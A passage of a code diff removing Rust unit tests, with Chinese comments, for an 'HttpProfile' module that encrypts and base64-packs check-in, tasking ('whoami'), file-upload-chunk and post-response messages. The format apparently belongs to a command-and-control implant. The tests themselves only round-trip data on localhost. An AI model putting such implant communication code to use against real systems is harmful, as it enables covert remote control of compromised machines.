-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        // 模拟服务端将响应封包
-        let b64_len = profile
-            .pack_message(&checkin_resp, &mut raw_buf, &mut b64_buf)
-            .unwrap();
-
-        // 客户端接收并零拷贝解析响应
-        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
-        let parsed = profile
-            .parse_checkin_response(&b64_buf[..b64_len], &mut client_raw_buf)
-            .unwrap();
-
-        assert_eq!(parsed.action, "checkin");
-        assert_eq!(parsed.status, "success");
-        assert_eq!(parsed.id, Some("87654321-4321-4321-4321-ba0987654321"));
-
-        // 将新的 Callback UUID 安全拷贝入持久化栈/静态缓冲区中
-        let mut session_uuid = [0u8; 36];
-        assert_eq!(parsed.copy_id_to(&mut session_uuid), Ok(true));
-        assert_eq!(&session_uuid, b"87654321-4321-4321-4321-ba0987654321");
-
-        // 业务完成后安全物理清空客户端工作缓冲区
-        zeroize_slice(&mut client_raw_buf);
-    }
-
-    #[test]
-    fn test_http_profile_pack_bytes_and_unpack_bytes() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/data", uuid, &crypto_ctx);
-
-        let original_data = b"raw_binary_stream_data_zero_alloc";
-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        let b64_len = profile
-            .pack_bytes(original_data, &mut raw_buf, &mut b64_buf)
-            .unwrap();
-        assert!(b64_len > 0);
-
-        let mut recv_buf = [0u8; MAX_RAW_LEN];
-        let decrypted = profile
-            .unpack_bytes(&b64_buf[..b64_len], &mut recv_buf)
-            .unwrap();
-        assert_eq!(decrypted, original_data);
-    }
-
-    #[test]
-    fn test_http_profile_parse_tasking_response_ref_roundtrip() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/get_tasking", uuid, &crypto_ctx);
-
-        let json_payload = br#"{"action":"get_tasking","status":"success","tasks":[{"id":"t-1","command":"whoami","parameters":""}]}"#;
-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        let b64_len = profile
-            .pack_bytes(json_payload, &mut raw_buf, &mut b64_buf)
-            .unwrap();
-
-        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
-        let parsed = profile
-            .parse_get_tasking_response_ref(&b64_buf[..b64_len], &mut client_raw_buf)
-            .unwrap();
-
-        assert_eq!(parsed.action, "get_tasking");
-        assert_eq!(parsed.status, "success");
-        assert_eq!(parsed.tasks.len(), 1);
-        assert_eq!(parsed.tasks[0].id, "t-1");
-        assert_eq!(parsed.tasks[0].command, "whoami");
-    }
-
-    #[test]
-    fn test_http_profile_build_file_chunk_payload_roundtrip() {
-        let master_key = b"01234567890123456789012345678901";
-        let uuid = "12345678-1234-1234-1234-1234567890ab";
-        let crypto_ctx = CryptoContext::new(master_key).unwrap();
-        let profile = HttpProfile::new("http://127.0.0.1:8080", "/upload", uuid, &crypto_ctx);
-
-        let chunk = FileChunkPayload::new(
-            "upload",
-            "task-upload-002",
-            "file-uuid-002",
-            2,
-            10,
-            "CHUNK_DATA_BASE64_XYZ",
-        );
-
-        let mut raw_buf = [0u8; MAX_RAW_LEN];
-        let mut b64_buf = [0u8; MAX_B64_LEN];
-
-        let b64_len = profile
-            .build_file_chunk_payload(&chunk, &mut raw_buf, &mut b64_buf)
-            .unwrap();
-        assert!(b64_len > 0);
-
-        let mut client_raw_buf = [0u8; MAX_RAW_LEN];
-        let unpacked: FileChunkPayload<'_> = profile
-            .unpack_message(&b64_buf[..b64_len], &mut client_raw_buf)
-            .unwrap();
-        assert_eq!(unpacked.action, "upload");
-        assert_eq!(unpacked.chunk_num, 2);
-        assert_eq!(unpacked.total_chunks, 10);
-        assert_eq!(unpacked.chunk_data, "CHUNK_DATA_BASE64_XYZ");
+        let post_str = core::str::from_utf8(&server_post_raw[..post_plain_len]).unwrap();
+        assert!(post_str.contains("\"action\":\"post_response\""));
+        assert!(post_str.contains("whoami output"));
     }
 }
